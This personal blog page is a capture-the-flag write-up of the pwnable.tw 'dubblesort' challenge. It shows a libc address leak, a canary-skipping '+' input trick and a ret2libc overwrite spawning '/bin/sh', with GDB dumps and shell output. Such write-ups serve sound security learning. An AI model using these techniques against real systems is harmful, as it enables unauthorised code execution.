<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  Dubblesort · Lucas Ball
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Lucas Ball">
<meta name="description" content="
  Dubblesort
  
    
    Link to heading
  

Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it&rsquo;s solved and here&rsquo;s how it&rsquo;s done.
Start out by checking the security on the binary:
pwn checksec ./dubblesort
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here. Lets test out the program to see what happens:">
<meta name="keywords" content="blog,cybersecurity,infosec,personal,pwn">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Dubblesort">
  <meta name="twitter:description" content="Dubblesort Link to heading Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it’s solved and here’s how it’s done.
Start out by checking the security on the binary:
pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Yikes. Alright looks like there’s gonna be a very specific bug here. Lets test out the program to see what happens:">

<meta property="og:url" content="http://localhost:1313/cyber/pwnable/dubblesort/">
  <meta property="og:site_name" content="Lucas Ball">
  <meta property="og:title" content="Dubblesort">
  <meta property="og:description" content="Dubblesort Link to heading Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it’s solved and here’s how it’s done.
Start out by checking the security on the binary:
pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Yikes. Alright looks like there’s gonna be a very specific bug here. Lets test out the program to see what happens:">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="cyber">
    <meta property="article:published_time" content="2023-01-27T19:46:10-08:00">
    <meta property="article:modified_time" content="2023-01-27T19:46:10-08:00">




<link rel="canonical" href="http://localhost:1313/cyber/pwnable/dubblesort/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      Lucas Ball
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/homelab/">Homelab</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/mywork">My Work</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/cyber/">Cyber</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/images/resume.pdf">Resume</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/contact/">Contact</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="http://localhost:1313/cyber/pwnable/dubblesort/">
          Dubblesort
        </a>
      </h1>
    </header>

    <h1 id="dubblesort">
  Dubblesort
  <a class="heading-link" href="#dubblesort">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it&rsquo;s solved and here&rsquo;s how it&rsquo;s done.</p>
<p>Start out by checking the security on the binary:</p>
<pre tabindex="0"><code>pwn checksec ./dubblesort
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre><p>Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here. Lets test out the program to see what happens:</p>
<pre tabindex="0"><code>What your name :a
Hello a
��,How many numbers do you what to sort :2
Enter the 0 number : 1
Enter the 1 number : 2
Processing......
Result :
1 2
</code></pre><p>Hmmm. Looks like there&rsquo;s some weird stuff going on when it asks for your name. After a look in GDB, looks like it&rsquo;s just printing out whatever is on the stack. There&rsquo;s some random values there to look at:</p>
<pre tabindex="0"><code>pwndbg&gt; x/20x 0xffffda3c &lt;- Location of name on the stack
0xffffda3c:     0x000040d7      0xffffdc69      0x0000002f      0x0000009e
0xffffda4c:     0x00000016      0x00008000      0xf7fcf000      0xf7fcd244
</code></pre><p>Woah that 7th value is interesting&hellip; After a check in vmmap I can see it&rsquo;s the GOT of libc. This means if we leak this, there is a chance of a ret2libc attack. Alright lets try it to see what we get. I need to input 25 &ldquo;A&quot;s and I should be able to leak that value. The reason it has to be 25 and not 24 is because the printf call will stop the print at the null value in the address (e.g <code>0xf7fcf000</code>) the first character <code>\x00</code> will stop the printf before it prints the rest of the address. So we can overwrite that last value and it should print the whole thing like this: <code>0xf7fcf041</code> in this case: <code>0x41</code> is the hex value of &ldquo;A&rdquo; which will be printed to the screen along with the rest of the address. After this leak, we now can calculate the base of libc.</p>
<p>Okay have a libc leak. How can we utilize this to our advantage. My first though was hey maybe if I buffer overflow the part where it asks me for the number I&rsquo;d like to sort maybe I can overwrite the return address on the stack. Welp:</p>
<pre tabindex="0"><code>What your name :A
Hello A
��,How many numbers do you what to sort :1
Enter the 0 number : 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Processing......
Result :
4294967295
</code></pre><p>Okay looks like it converts my number directly into a %u unsigned integer</p>
<pre tabindex="0"><code> 0x56555a95 &lt;main+210&gt;    call   __isoc99_scanf@plt
        format: 0x56555bfa ◂— 0x45007525 /* &#39;%u&#39; */
        vararg: 0xffffda4c —▸ 0xf7ffc7e0
</code></pre><p>Yep.</p>
<p>Okay what if we figure out a way to exploit the sorting function. Maybe there&rsquo;s some weird stuff with the sorting function that would cause some funkiness in the program. Lets try it:</p>
<pre tabindex="0"><code>What your name :a
Hello a
��,How many numbers do you what to sort :25
Enter the 0 number : 1
Enter the 1 number : 1
Enter the 2 number : 1
Enter the 3 number : 1
Enter the 4 number : 1
Enter the 5 number : 1
Enter the 6 number : 1
Enter the 7 number : 1
Enter the 8 number : 1
Enter the 9 number : 1
Enter the 10 number : 1
Enter the 11 number : 1
Enter the 12 number : 1
Enter the 13 number : 1
Enter the 14 number : 1
Enter the 15 number : 1
Enter the 16 number : 1
Enter the 17 number : 1
Enter the 18 number : 1
Enter the 19 number : 1
Enter the 20 number : 1
Enter the 21 number : 1
Enter the 22 number : 1
Enter the 23 number : 1
Enter the 24 number : 1
Processing......
1Result :
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 *** stack smashing detected ***: terminated
</code></pre><p>OOOH we got a stack smash. HUH??? What&rsquo;s going on. I took a look at our input in GDB to see what I could make of it:
Before input:</p>
<pre tabindex="0"><code>pwndbg&gt; x/30x 0xffffda4c
0xffffda4c:     0xf7ffc7e0      0x00000000      0x00000000      0x00005034
0xffffda5c:     0x5998aa00      0x029c6fbf      0x00000534      0x0000009e
0xffffda6c:     0xf7fb0a61      0x00000000      0xf7fba000      0xf7ffc7e0
0xffffda7c:     0xf7fbdc68      0xf7fba000      0xf7fe22f0      0x00000000
0xffffda8c:     0x56555601      0x565557a9      0x56556fa0      0x00000001
0xffffda9c:     0x56555b72      0x00000001      0xffffdb64      0xffffdb6c
0xffffdaac:     0x5998aa00 &lt;- Stack Canary
</code></pre><p>After input:</p>
<pre tabindex="0"><code>0xffffda4c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda5c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda6c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda7c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda8c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda9c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffdaac:     0x00000001 &lt;- Was stack canary
</code></pre><p>Okay we overwrote the stack canary. That sucks, but that means if we can do that, we can overwrite the return address. The only problem is the stack canary will always be in the way. If only there was a way to skip over the canary&hellip; Well if I try to enter a letter &ldquo;L&rdquo; into the input at any point. It crashes the scanf function and it doesn&rsquo;t read anything else. This was the method I started with, but soon found out a much better solution. If you enter the &ldquo;+&rdquo; symbol instead of the number, it won&rsquo;t crash the scanf function, but it also won&rsquo;t overwrite whatever is in memory at that spot. So If I do this at the stack canary it will prevent it from being overwritten. There&rsquo;s one more obstacle in this: Whatever I enter needs to be in ascending order. This is a sorting function right?</p>
<p>Alright so looks like I have all the information I need now to complete the exploit. I start out with a leak in libc. Then I enter an ascending stack with a &ldquo;+&rdquo; at the 25th spot and then All the values afterward need to be larger than the stack canary. This would allow me to overwrite the return address and change the control flow of the program. The inputs would look a little like this:</p>
<pre tabindex="0"><code>&#34;1&#34; * 24
&#34;+&#34; 
&#34;&lt;addr_system&gt;&#34; * 9 &lt;-- 9th value overwrites return addr
&#34;&lt;addr_binsh&gt;&#34;
</code></pre><p>Since I have the address of libc, I can calculate all the offsets to get the address of system and the string &ldquo;/bin/sh&rdquo;. When the program returns it will call <code>system(&quot;/bin/sh&quot;)</code> And there&rsquo;s our shell.</p>
<pre tabindex="0"><code>[b&#39;Hello&#39;, b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAPm\xf7D2m\xf7\x01\xf6YV\xa9\xf7YV\xa0\x0fZV\x01&#39;, b&#39;How&#39;, b&#39;many&#39;, b&#39;numbers&#39;, b&#39;do&#39;, b&#39;you&#39;, b&#39;what&#39;, b&#39;to&#39;, b&#39;sort&#39;, b&#39;:&#39;]
./e.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(length))
./e.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(system))
./e.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(binsh))
Processing......
Result :
4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 2294056704 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4150779531 $ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</code></pre><p>For more details on the actual exploit script take a look at <code>e.py</code> in the repo.</p>
<h3 id="issues">
  Issues
  <a class="heading-link" href="#issues">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>I thought I&rsquo;d add an issues section for this challenge because I didn&rsquo;t necessarily have much trouble with the exploit, but I had a lot of problems with the setup of the program.</p>
<p>This is the first program on pwnable.tw that I&rsquo;ve done that offers a download of the libc that is supposed to be used in the program. What they didn&rsquo;t include was a copy of the ld.so for the program. This means that the program will run on your personal libc and the exploit will not actually be the same as the remote one.</p>
<p>The way to get around this is to patch the elf to use the libc that they give you. I found a super nice tool called <a href="https://github.com/io12/pwninit"  class="external-link" target="_blank" rel="noopener">pwninit</a> That you can use to patch the ELF automatically. It&rsquo;s like magic. Just hop into the directory with the libc and the binary you want to patch and run <code>pwninit</code> and it will find the necessary files and patch the ELF. This was essential to solving the problem. Without this, I would not have been able to run the binary in gdb and find the proper offsets.</p>

  </article>
</section>

  

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2026
     Lucas Ball 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
